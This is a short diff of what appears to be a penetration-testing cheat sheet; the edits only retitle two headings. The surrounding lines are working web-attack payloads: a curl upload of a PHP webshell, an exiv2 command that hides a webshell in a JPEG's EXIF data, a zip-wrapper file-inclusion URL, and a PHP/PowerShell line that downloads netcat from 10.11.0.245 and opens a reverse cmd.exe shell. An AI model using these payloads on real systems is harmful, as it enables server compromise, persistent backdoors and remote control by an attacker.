@@ -219,7 +219,7 @@ curl -X PUT -d '<?php system($_GET["c"]);?>' http://192.168.2.99/shell.php
 * 00%
 * file.jpg with php backdoor in exif \(see below\)
 
-### Injecting php webshell into JPEG
+### Injecting PHP into JPEG
 
 ```bash
 exiv2 -c'A "<?php system($_REQUEST['cmd']);?>"!' backdoor.jpeg
@@ -307,7 +307,7 @@ mv payload.zip shell.jpg;
 http://example.com/index.php?page=zip://shell.jpg%23payload.php
 ```
 
-### Remote File InclusionShell: Windows + PHP
+### Remote File Inclusion Shell: Windows + PHP
 
 ```php
 <?php system("powershell -Command \"& {(New-Object System.Net.WebClient).DownloadFile('http://10.11.0.245/netcat/nc.exe','nc.exe'); cmd /c nc.exe 10.11.0.245 4444 -e cmd.exe\" }"); ?>
